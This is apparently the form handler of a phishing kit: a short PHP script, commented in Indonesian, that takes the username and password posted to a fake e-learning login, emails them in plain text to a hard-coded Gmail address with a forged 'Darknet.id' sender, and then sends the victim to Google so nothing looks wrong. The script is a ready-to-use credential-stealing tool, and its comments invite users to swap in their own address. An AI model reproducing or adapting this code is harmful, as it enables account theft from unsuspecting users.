<!-- <?php
############################################
##        Author: Script Haxorisme            ##
##       Mailer: Script Haxorisme           ##
##       Modifer: Script Haxorisme            ##
############################################
/* JANGAN GANTI COPYRIGHT NYA YA SAYANG */

$subjek = 'Account Elearning';
$mailto = 'felixjosua00@gmail.com'; //masukin email lo disini

/* Fungsi berikut untuk mengambil input field. */

$imel = $_POST['username'];
$paswot = $_POST['password'];

/* Mengambil informasi untuk dikirim kepada facebook anda !. */

$body = <<<EOD
<br><hr><br>

Email : <font color="red">$imel</font> <br>
Password : <font color="red">$paswot</font> <br>
EOD;


$headers = "From: Darknet.id\r\n"; // Buat nunjukin pengirim email.
$headers .= "Content-type: text/html\r\n"; // Untuk memerintahkan server melakukan coding teks.
$success = mail($mailto, $subjek, $body, $headers); // Hal-hal yang akan dikirim.

?>
<?php
$random = rand(1000,5000);
?> -->
 
 <script type="text/javascript">
    window.open("http://www.google.com","_self");
</script>
